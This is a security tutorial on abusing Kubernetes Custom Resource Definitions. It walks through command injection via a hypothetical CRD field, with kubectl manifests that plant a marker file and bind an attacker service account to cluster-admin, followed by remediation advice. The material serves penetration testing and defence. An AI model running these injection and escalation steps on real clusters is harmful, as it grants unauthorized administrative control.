
# Kubernetes Custom Resource Definition (CRD) Abuse

## 1. Overview

### Attack Vector Description

Custom Resource Definitions (CRDs) allow users to extend the Kubernetes API with their own custom resources. While powerful, CRDs can introduce security vulnerabilities if not configured and managed correctly.  An attacker can leverage improperly configured CRDs to escalate privileges, gain unauthorized access to resources, or even achieve cluster-wide code execution. This is done by crafting malicious CRD instances that manipulate the underlying controller logic associated with that CRD. The attack targets the controller's behavior rather than the CRD definition itself.

### Potential Impact and Consequences

*   **Privilege Escalation:**  Abuse of CRDs can allow an attacker with limited permissions to gain administrative control over the Kubernetes cluster.
*   **Data Exfiltration:** The CRD controller might be manipulated to expose sensitive data or route it to attacker-controlled locations.
*   **Denial of Service (DoS):**  A malicious CRD instance could cause the CRD controller to crash or consume excessive resources, leading to a DoS.
*   **Arbitrary Code Execution:** In some cases, depending on the controller's logic and trust of the CRD data, it might be possible to achieve arbitrary code execution on the nodes or within the controller's container.
*   **Resource Manipulation:** Attackers can manipulate custom resources beyond their intended purpose, leading to unexpected or harmful behavior.

### Risk Level Assessment

**Critical/High**, depending on the specific CRD implementation and the permissions granted to the controller service account. If the CRD controller runs with cluster admin rights, the risk is Critical. If the controller runs with limited permissions, the risk is still High, as privilege escalation is possible.

### Technical Explanation of Why This Vulnerability Exists

The vulnerability exists because CRDs are essentially a framework for extending the Kubernetes API, but the security is delegated to the *controller* that manages the CRD instances.

*   **Lack of Input Validation:** CRD controllers might not properly validate the data provided in custom resource instances. This can lead to injection vulnerabilities, such as command injection or SQL injection (if the controller interacts with a database).
*   **Excessive Permissions:**  The service account assigned to the CRD controller might have overly permissive roles and role bindings, allowing it to access and modify sensitive resources.
*   **Trust in CRD Data:**  The controller might trust the data in the CRD instance without proper sanitization or escaping, leading to vulnerabilities when the data is used to interact with other services or systems.
*   **Unsafe Default Configurations:**  The CRD definition itself or the default values defined within it might expose insecure configurations that can be exploited.
*   **Implementation Bugs:** Bugs in the controller code itself are a common source of vulnerabilities.  These bugs might be exploitable using specially crafted CRD instances.

### Prerequisites and Conditions Needed

1.  **Knowledge of CRDs:**  The attacker needs to understand the purpose and structure of the specific CRD being targeted.
2.  **Access to Create CRD Instances:**  The attacker needs to have the Kubernetes `create` permission on the specific custom resource defined by the CRD.
3.  **Identification of the CRD Controller:**  The attacker needs to identify the controller responsible for managing instances of the CRD.
4.  **Understanding of Controller's Logic:**  Ideally, the attacker has some understanding of how the controller processes data from the CRD instance. This can be obtained through reverse engineering, documentation analysis, or trial and error.
5.  **Controller Service Account Permissions:** Understanding the permissions granted to the controller's service account is crucial for determining the potential impact of exploitation.

## 2. Validation and Exploitation Steps

**Scenario:** Assume there's a CRD named `ExampleCRD` with a field called `command` which the controller uses (unsafely) as part of a system call. The goal is to validate the vulnerability and then execute arbitrary commands on the cluster. The CRD is `examplecrds.example.com`.

### Phase 1: Discovery and Validation

1.  **List Existing CRDs:**

    ```bash
    kubectl get crds
    ```

    **Explanation:**  This command lists all Custom Resource Definitions installed in the cluster.  It's the first step to identify available CRDs.
    **Expected Output:**  A list of CRDs, including `examplecrds.example.com`.
    **Contribution:**  Identifies the target CRD.
2.  **Describe the Target CRD:**

    ```bash
    kubectl describe crd examplecrds.example.com
    ```

    **Explanation:**  This command describes the `examplecrds.example.com` CRD. This reveals the CRD's schema, including the available fields.
    **Expected Output:** The CRD's YAML definition, including information about the `spec.command` field, its type (likely string), and any validation rules (if any). Pay attention to which API version the CRD is registered with (e.g., `example.com/v1`).
    **Contribution:**  Reveals the structure of the CRD and potential attack vectors.
3.  **Check RBAC Permissions:**

    ```bash
    kubectl auth can-i create examplecrds.example.com
    ```

    **Explanation:**  This command checks if the current user (or service account) has the permission to create instances of `examplecrds.example.com`.
    **Expected Output:**  "yes" or "no". If "yes", you can proceed with creating CRD instances.  If "no", you'll need to find another way to obtain these permissions (e.g., through another vulnerability).
    **Contribution:** Verifies that the attacker has the required permissions to proceed with the attack.

4.  **Create a Malicious CRD Instance (Validation):**

    ```bash
    cat <<EOF | kubectl apply -f -
    apiVersion: example.com/v1
    kind: ExampleCRD
    metadata:
      name: exploit-test
    spec:
      command: "echo 'Validation Successful'"
    EOF
    ```

    **Explanation:**  This command creates a CRD instance named `exploit-test` of kind `ExampleCRD` with the `command` field set to `echo 'Validation Successful'`.  This is a preliminary test to see if the controller processes the `command` field and executes it (even if sanitization is expected to be implemented.)
    **Expected Output:**  `examplecrd.example.com/exploit-test created`. Observe the controller's logs. If the controller correctly executes the `echo` command, you'll see "Validation Successful" in the controller logs.
    **Contribution:** Confirms that the `command` field is processed by the controller and that the controller's service account has the permissions to perform actions based on the command.
    **Alternative Approaches:** If direct access to the controller logs is unavailable, attempt to modify a file or create a network connection that would be visible if the command is executed.

### Phase 2: Exploitation

1.  **Create a Malicious CRD Instance (Exploitation):**

    ```bash
    cat <<EOF | kubectl apply -f -
    apiVersion: example.com/v1
    kind: ExampleCRD
    metadata:
      name: exploit
    spec:
      command: "touch /tmp/pwned"
    EOF
    ```

    **Explanation:**  This command creates another CRD instance named `exploit`, but this time the `command` field is set to `touch /tmp/pwned`. This attempts to create a file named `/tmp/pwned` on the file system of the node or the container running the controller.
    **Expected Output:** `examplecrd.example.com/exploit created`.
    **Contribution:**  Attempts to execute arbitrary commands on the target system.

2.  **Verify Exploitation (if applicable):**

    *If the controller runs on a node:*

        ```bash
        kubectl get nodes -o wide
        ```

        **Explanation:** Gets the node name where the controller pod is running.

        ```bash
        kubectl exec -it <pod-name> -n <namespace> -- bash -c "ls -l /tmp/pwned"
        ```

        **Explanation:** Executes a command inside the controller's pod to check if the `/tmp/pwned` file exists. Replace `<pod-name>` and `<namespace>` with the actual values. This requires `exec` access to the pod.
        **Expected Output:**  If the command injection was successful, you will see information about the `/tmp/pwned` file (e.g., `-rw-r--r-- 1 root root 0 Oct 26 14:55 /tmp/pwned`).

    *If the controller runs as a Deployment (more likely):*

        ```bash
        kubectl get pods -n <namespace> -l app=<controller-app-name> -o wide
        ```

        **Explanation:**  Gets the pod name and node name where the controller deployment is running. Replace `<namespace>` and `<controller-app-name>` with the correct values. You'll need to determine the controller application name.
        **Expected Output:** Information about the pod. The "NODE" column indicates the node where the pod is running.

        ```bash
        kubectl exec -it <pod-name> -n <namespace> -- bash -c "ls -l /tmp/pwned"
        ```

        **Explanation:** Executes a command inside the controller's pod to check if the `/tmp/pwned` file exists. Replace `<pod-name>` and `<namespace>` with the actual values. This requires `exec` access to the pod.
        **Expected Output:**  If the command injection was successful, you will see information about the `/tmp/pwned` file (e.g., `-rw-r--r-- 1 root root 0 Oct 26 14:55 /tmp/pwned`).
    **Contribution:**  Verifies that the command injection was successful.

3.  **Escalate Privileges (if applicable):**

    If the controller runs with sufficient privileges, the attacker can use the command injection to escalate privileges.  For example, if the controller runs with cluster-admin privileges, the attacker could create a new service account with those privileges:

    ```bash
    cat <<EOF | kubectl apply -f -
    apiVersion: example.com/v1
    kind: ExampleCRD
    metadata:
      name: escalate
    spec:
      command: |
        kubectl create sa attacker-sa -n kube-system
        kubectl create clusterrolebinding attacker-sa-binding --clusterrole cluster-admin --serviceaccount=kube-system:attacker-sa
    EOF
    ```

    **Explanation:**  This command creates a service account named `attacker-sa` in the `kube-system` namespace and grants it cluster-admin privileges.
    **Expected Output:**  `examplecrd.example.com/escalate created`.

    To use the new service account, you'd typically extract its token and use that to authenticate with the cluster. This is heavily dependent on the environment and how tokens are generated.

    **Contribution:**  Achieves privilege escalation.

### Remediation Recommendations

1.  **Input Validation and Sanitization:**  Implement robust input validation and sanitization on all data received from CRD instances.  Use whitelisting instead of blacklisting to define acceptable inputs. Escape shell metacharacters and other potentially harmful characters.
2.  **Principle of Least Privilege:**  Grant the CRD controller service account only the minimum necessary permissions. Avoid granting cluster-admin privileges. Carefully review and restrict the RBAC roles and role bindings associated with the controller.
3.  **Secure Coding Practices:**  Follow secure coding practices when developing the CRD controller. Avoid using `eval()` or similar functions that can execute arbitrary code based on user input.
4.  **Regular Security Audits:**  Perform regular security audits of the CRD definitions and the controller code to identify and address potential vulnerabilities.
5.  **Use Security Contexts:**  Use security contexts in the controller's pod specification to restrict the capabilities of the container and prevent privilege escalation.  For example, prevent privilege escalation by setting `allowPrivilegeEscalation: false`.
6.  **Consider Policy Enforcement:** Tools like Open Policy Agent (OPA) can be used to enforce policies on CRD instances, preventing the creation of malicious resources.
7.  **Auditing and Logging:** Enable auditing and logging to monitor activity related to CRD instances and the controller.  This can help detect and respond to suspicious behavior.

This comprehensive documentation provides a detailed understanding of the custom resource definition abuse vulnerability, including the attack vector, potential impact, and remediation recommendations.  The step-by-step validation and exploitation steps allow penetration testers to reproduce the findings and assess the risk in their environments.
